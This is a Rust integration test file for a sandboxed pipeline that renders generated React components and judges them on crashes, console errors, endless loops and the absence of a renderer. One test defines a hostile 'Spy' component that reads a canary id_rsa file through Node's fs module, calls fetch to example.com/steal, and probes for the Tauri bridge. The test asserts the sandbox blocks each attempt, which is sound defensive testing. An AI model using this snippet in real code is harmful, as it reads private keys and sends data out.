//! LOT-016 blocking tests, with real processes only: changed components are mounted with the
//! real React in `happy-dom`, inside the native OS sandbox, by the Judge's pipeline.
//! (`pnpm install` must have run, and `node` must be on `PATH`; Unix only, see LOT-015.)
#![cfg(unix)]

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;
use std::time::{Duration, Instant};

use host_core::{CheckpointManager, DiagnosticSource, HiloValidationState, WorkspaceTrustGate};
use judge_orchestrator::judge::*;
use judge_orchestrator::policy::HostAuthority;
use sandbox_runner::{native_sandbox, MemoryAuditSink, ResourceLimits};

const COMPONENT: &str = "src/Badge.tsx";
const BADGE: &str =
    "export function Badge() {\n  return <output aria-label=\"Balance\">42</output>;\n}\n";

fn git(dir: &Path, args: &[&str]) {
    let output = Command::new("git")
        .args(args)
        .current_dir(dir)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .output()
        .expect("git must be installed to run the LOT-016 tests");
    assert!(output.status.success(), "git {args:?}: {output:?}");
}

struct Fixture {
    _dirs: [tempfile::TempDir; 3],
    pipeline: JudgePipeline,
    authority: Arc<HostAuthority>,
    runs: std::cell::Cell<u32>,
}

/// A workspace whose `node_modules` links to the repository's real packages; with `react`
/// false, React is not installed and nothing can render a component.
fn fixture(react: bool) -> Fixture {
    let repo = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("../..")
        .canonicalize()
        .unwrap();
    let root_modules = repo.join("node_modules");
    let app_modules = repo.join("apps").join("desktop-tauri").join("node_modules");
    assert!(
        app_modules.join("react").join("package.json").is_file(),
        "run `pnpm install` first: the preview tests use the repository's React"
    );
    let workspace = tempfile::tempdir().unwrap();
    let root = workspace.path();
    std::fs::create_dir_all(root.join("src")).unwrap();
    for (path, text) in [
        (".gitignore", "node_modules\n"),
        ("package.json", "{ \"name\": \"fixture\", \"private\": true, \"type\": \"module\" }\n"),
        ("biome.json", "{ \"formatter\": { \"indentStyle\": \"space\", \"indentWidth\": 2 } }\n"),
        (
            "tsconfig.json",
            "{ \"compilerOptions\": { \"strict\": true, \"noEmit\": true, \"target\": \"ES2022\", \"module\": \"ESNext\", \"moduleResolution\": \"Bundler\", \"jsx\": \"react-jsx\", \"lib\": [\"ES2022\", \"DOM\"], \"skipLibCheck\": true, \"types\": [] }, \"include\": [\"src\"] }\n",
        ),
        (COMPONENT, BADGE),
    ] {
        std::fs::write(root.join(path), text).unwrap();
    }
    let modules = root.join("node_modules");
    std::fs::create_dir_all(modules.join("@types")).unwrap();
    let link = |from: PathBuf, name: &str| {
        std::os::unix::fs::symlink(from.canonicalize().unwrap(), modules.join(name)).unwrap();
    };
    for name in ["vitest", "typescript", "@biomejs", "happy-dom"] {
        link(root_modules.join(name), name);
    }
    // The types stay: the code type-checks either way, only the renderer is missing.
    link(app_modules.join("@types/react"), "@types/react");
    if react {
        for name in ["react", "react-dom"] {
            link(app_modules.join(name), name);
        }
    }
    git(root, &["init", "-q", "-b", "main"]);
    git(root, &["config", "user.name", "Test"]);
    git(root, &["config", "user.email", "test@example.invalid"]);
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", "fixture"]);

    let worktrees = tempfile::tempdir().unwrap();
    let trust = tempfile::tempdir().unwrap();
    let gate = WorkspaceTrustGate::open(trust.path().join("trust.json"), root).unwrap();
    gate.grant().unwrap();
    let mut plan = node_verification_plan(
        &gate,
        &NodeToolchain::from_path().expect("node on PATH"),
        ResourceLimits {
            wall_timeout: Duration::from_secs(120),
            ..ResourceLimits::default()
        },
    )
    .unwrap();
    // The linked packages live in the repository's own store.
    plan.read_only_paths
        .push(root_modules.canonicalize().unwrap());
    let runner = native_sandbox(Arc::new(MemoryAuditSink::default()))
        .expect("the native OS sandbox is required (fail closed)");
    let authority = Arc::new(HostAuthority::new().unwrap());
    let pipeline = JudgePipeline::new(
        Arc::new(
            CheckpointManager::open(root)
                .unwrap()
                .with_worktrees_dir(worktrees.path())
                .unwrap(),
        ),
        Arc::from(runner),
        Arc::clone(&authority),
        plan,
    );
    Fixture {
        _dirs: [workspace, worktrees, trust],
        pipeline,
        authority,
        runs: std::cell::Cell::new(0),
    }
}

/// The Judge's verdict on `files` replacing the workspace's.
fn judge(fx: &Fixture, files: &[(&str, &str)]) -> JudgeOutcome {
    fx.runs.set(fx.runs.get() + 1);
    let files: BTreeMap<String, String> = files
        .iter()
        .map(|(path, text)| ((*path).to_string(), (*text).to_string()))
        .collect();
    let task = format!("preview.{}", fx.runs.get());
    fx.pipeline
        .evaluate(
            &Verification {
                checkpoint_task: &task,
                task_id: "preview",
                files: &files,
                buffers: &BTreeMap::new(),
                impacted_tests: &[],
            },
            &mut |_| {},
        )
        .unwrap()
}

fn report(outcome: &JudgeOutcome) -> String {
    let mut text = String::new();
    for step in &outcome.steps {
        text.push_str(&format!(
            "{:?} passed={} exit={}\n",
            step.kind, step.passed, step.record.exit_code
        ));
        for item in &step.items {
            text.push_str(&format!(
                "    {} [{}] {}\n",
                item.file_path, item.code, item.message
            ));
        }
    }
    text
}

fn step(outcome: &JudgeOutcome, kind: StepKind) -> &StepReport {
    outcome
        .steps
        .iter()
        .find(|step| step.kind == kind)
        .unwrap_or_else(|| panic!("no {kind:?} step:\n{}", report(outcome)))
}

/// Blocking (spec 4.5, test 2): a component with 0 TypeScript and Biome errors that crashes
/// when mounted is `🔴`, with the runtime stack trace in the evidence. A `console.error` on
/// mount is `🔴` too. The same component rendering cleanly is `🟢` with its preview evidence.
#[test]
fn blocking_a_component_that_crashes_or_logs_an_error_on_mount_is_rejected() {
    let fx = fixture(true);

    let clean = judge(&fx, &[(COMPONENT, BADGE)]);
    assert_eq!(
        clean.verdict(),
        HiloValidationState::ValidatedGreen,
        "{}",
        report(&clean)
    );
    let evidence = &clean.evidence.evidence;
    assert_eq!(
        evidence.preview_report.inspected_url,
        "hilo-preview:src/Badge.tsx#Badge"
    );
    assert!(evidence.preview_report.dom_snapshot_hash.is_some());
    assert!(evidence.satisfies_validated_green(&evidence.tested_snapshot_hash));
    let snapshot = clean.preview.as_ref().unwrap();
    assert!(
        snapshot.document.contains("aria-label=\"Balance\""),
        "{}",
        snapshot.document
    );
    assert!(snapshot.document.contains("default-src 'none'"));
    assert!(
        snapshot.a11y.contains("output \"Balance\": 42"),
        "{}",
        snapshot.a11y
    );

    let crashing = "export function Badge() {\n  const items = JSON.parse(\"null\") as string[];\n  return <output>{items.length}</output>;\n}\n";
    let crashed = judge(&fx, &[(COMPONENT, crashing)]);
    assert_eq!(
        crashed.verdict(),
        HiloValidationState::FailedRed,
        "{}",
        report(&crashed)
    );
    assert!(
        step(&crashed, StepKind::Lint).passed,
        "{}",
        report(&crashed)
    );
    assert!(
        step(&crashed, StepKind::TypeCheck).passed,
        "{}",
        report(&crashed)
    );
    assert!(!step(&crashed, StepKind::Preview).passed);
    let evidence = &crashed.evidence.evidence;
    assert!(evidence.preview_report.uncaught_exception_count >= 1);
    let runtime = evidence
        .diagnostics
        .items
        .iter()
        .find(|item| item.source == DiagnosticSource::PreviewRuntime)
        .unwrap_or_else(|| panic!("{}", report(&crashed)));
    assert_eq!(runtime.file_path, COMPONENT);
    assert!(runtime.message.contains("TypeError"), "{}", runtime.message);
    assert!(
        runtime.message.contains("at Badge"),
        "the stack names the component: {}",
        runtime.message
    );
    assert!(!evidence.satisfies_validated_green(&evidence.tested_snapshot_hash));
    let feedback = agent_feedback(&crashed, 1, 2);
    assert!(
        feedback.contains("Component preview") && feedback.contains("TypeError"),
        "{feedback}"
    );

    let logging = "import { useEffect } from \"react\";\n\nexport function Badge() {\n  useEffect(() => {\n    console.error(\"Badge: balance missing\");\n  }, []);\n  return <output>0</output>;\n}\n";
    let logged = judge(&fx, &[(COMPONENT, logging)]);
    assert_eq!(
        logged.verdict(),
        HiloValidationState::FailedRed,
        "{}",
        report(&logged)
    );
    assert_eq!(
        logged.evidence.evidence.preview_report.console_error_count,
        1
    );
    assert!(step(&logged, StepKind::Preview)
        .items
        .iter()
        .any(|item| item.message.contains("Badge: balance missing")));
}

/// Blocking (spec 4.5, test 1): a generated component trying to reach the Tauri bridge, the
/// framing document, a secret on disk and the network finds none of them.
#[test]
fn blocking_a_malicious_component_is_isolated_from_the_ide_the_disk_and_the_network() {
    let fx = fixture(true);
    let secrets = tempfile::tempdir().unwrap();
    let canary = secrets.path().join("id_rsa");
    std::fs::write(&canary, "TOP-SECRET-CANARY").unwrap();
    assert_eq!(
        std::fs::read_to_string(&canary).unwrap(),
        "TOP-SECRET-CANARY"
    );
    let spy = format!(
        r#"import {{ useEffect, useState }} from "react";

type Fs = {{ readFileSync(path: string, encoding: string): string }};
type Node = {{ getBuiltinModule(name: string): Fs }};

function readSecret(): string {{
  try {{
    const node = Reflect.get(globalThis, "process") as Node;
    return node.getBuiltinModule("node:fs").readFileSync({path}, "utf8");
  }} catch {{
    return "denied";
  }}
}}

export function Spy() {{
  const [network, setNetwork] = useState("pending");
  useEffect(() => {{
    fetch("http://example.com/steal").then(
      () => setNetwork("reached"),
      () => setNetwork("failed"),
    );
  }}, []);
  const tauri = "__TAURI__" in window || "__TAURI_INTERNALS__" in window ? "present" : "absent";
  const top = window.top === window && window.parent === window ? "self" : "framed";
  return (
    <ul>
      <li>tauri:{{tauri}}</li>
      <li>top:{{top}}</li>
      <li>secret:{{readSecret()}}</li>
      <li>network:{{network}}</li>
    </ul>
  );
}}
"#,
        path = serde_json::to_string(&canary.to_string_lossy()).unwrap()
    );
    let outcome = judge(&fx, &[("src/Spy.tsx", spy.as_str())]);
    let snapshot = outcome
        .preview
        .as_ref()
        .unwrap_or_else(|| panic!("{}", report(&outcome)));
    let html = &snapshot.document;
    assert!(html.contains("tauri:absent"), "{html}");
    assert!(html.contains("top:self"), "{html}");
    assert!(html.contains("secret:denied"), "{html}");
    assert!(!html.contains("TOP-SECRET-CANARY"));
    assert!(!html.contains("network:reached"), "{html}");
    let evidence = &outcome.evidence.evidence;
    assert!(!evidence.preview_report.crashed, "{}", report(&outcome));
    // What the IDE shows runs no script and loads nothing.
    assert!(html.contains("default-src 'none'"));
}

/// Spec 4.8: a render that never ends is stopped by the watchdog; the Judge answers `🔴`
/// instead of hanging.
#[test]
fn an_endless_render_is_stopped_by_the_watchdog() {
    let fx = fixture(true);
    let looping =
        "export function Badge() {\n  let spins = 0;\n  for (;;) {\n    spins += 1;\n  }\n}\n";
    let started = Instant::now();
    let outcome = judge(&fx, &[(COMPONENT, looping)]);
    assert!(started.elapsed() < Duration::from_secs(60));
    assert_eq!(outcome.verdict(), HiloValidationState::FailedRed);
    let preview = step(&outcome, StepKind::Preview);
    assert!(!preview.passed);
    assert!(
        preview
            .items
            .iter()
            .any(|item| item.message.contains("watchdog")),
        "{}",
        report(&outcome)
    );
    assert!(outcome.evidence.evidence.preview_report.crashed);
}

/// Acceptance 4.6: a UI change nothing could render is never `🟢`.
#[test]
fn a_component_change_without_a_renderer_is_never_validated() {
    let fx = fixture(false);
    let outcome = judge(&fx, &[(COMPONENT, BADGE)]);
    assert!(outcome
        .steps
        .iter()
        .all(|step| step.kind != StepKind::Preview));
    assert_eq!(
        outcome.verdict(),
        HiloValidationState::ReviewYellow,
        "{}",
        report(&outcome)
    );
    assert!(fx.authority.verify_evidence(&outcome.evidence));
}
